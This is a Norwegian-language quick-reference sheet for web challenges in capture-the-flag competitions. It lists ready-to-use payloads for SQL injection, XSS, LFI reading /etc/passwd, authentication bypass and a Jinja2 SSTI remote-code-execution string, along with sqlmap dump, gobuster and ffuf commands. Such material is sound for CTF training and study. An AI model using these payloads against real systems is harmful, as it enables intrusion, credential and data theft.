# 🌐 Hurtigreferanse for weboppgaver i CTF

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Web-CTF.tr.md) • [🇬🇷 Ελληνικά](Web-CTF.el.md)

---

## 💉 SQL-injeksjon

> **Begreper:** XSS kjører skript i en nettleserkontekst. LFI inkluderer lokale filer, mens SSTI tolker inndata som en mal på serveren. JWT er et format for token med påstander; en PoC demonstrerer en sårbarhet.

### Grunnleggende payloads
```sql
' OR 1=1--
' OR '1'='1
" OR ""="
admin'--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3--
```

### SQLMap
```bash
sqlmap -u "http://url?id=1" --dbs
sqlmap -u "http://url?id=1" -D dbname --tables
sqlmap -u "http://url?id=1" -D dbname -T users --dump
```

---

## 📜 XSS (Cross-Site Scripting)

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(document.cookie)</script>
javascript:alert(1)
```

---

## 📁 LFI (lokal filinkludering)

```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
/etc/passwd%00
php://filter/convert.base64-encode/resource=index.php
```

---

## 🔧 SSTI (Server-Side Template Injection)

### Deteksjon
```
{{7*7}}     → 49 (Jinja2/Twig)
${7*7}      → 49 (Freemarker)
<%= 7*7 %>  → 49 (ERB)
```

### Jinja2 RCE
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

---

## 🔐 Omgåelse av autentisering

```
admin' --
admin'/*
' OR 1=1 LIMIT 1--
Password: ' OR '1'='1
```

---

## 🍪 Cookie/JWT

> **Presisering:** JWT-linjen nedenfor er bare en forenklet plassholder. Et vanlig signert JWT har separate punktavgrensede base64url-kodede deler; hele tokenet kan ikke generelt dekodes med én vanlig Base64-operasjon. Se [JWT-standarden, RFC 7519](https://www.rfc-editor.org/rfc/rfc7519.html). LFI-eksemplet med nullbyte og de øvrige payloadene er miljø-/versjonsavhengige; SSTI-resultatet alene identifiserer ikke sikkert en bestemt motor.

```bash
# Dekoding av JWT
echo "eyJ..." | base64 -d

# Verktøy
jwt_tool.py token
jwt.io (online)
```

---

## 🛠️ Nyttige verktøy

```bash
# Prøv katalognavn fra en ordliste
gobuster dir -u http://url -w wordlist.txt

# Fuzzing (systematisk utprøving av inndata)
ffuf -u http://url/FUZZ -w wordlist.txt

# Finne parametere
arjun -u http://url
```

---

## 📋 Sjekkliste for weboppgaver i CTF

```markdown
□ Kontroller kildekoden (Ctrl+U)
□ Kontroller robots.txt og sitemap.xml
□ Kontroller informasjonskapsler og JWT
□ Test SQL-injeksjon i inndata
□ Test XSS i inndata
□ Test LFI i filparametere
□ Se etter SSTI
□ Prøv katalognavn fra en ordliste
□ Se etter eksponert .git
```

---

**Tilbake til CTF:** [🏁 CTF-oversikt](./README.nb.md)
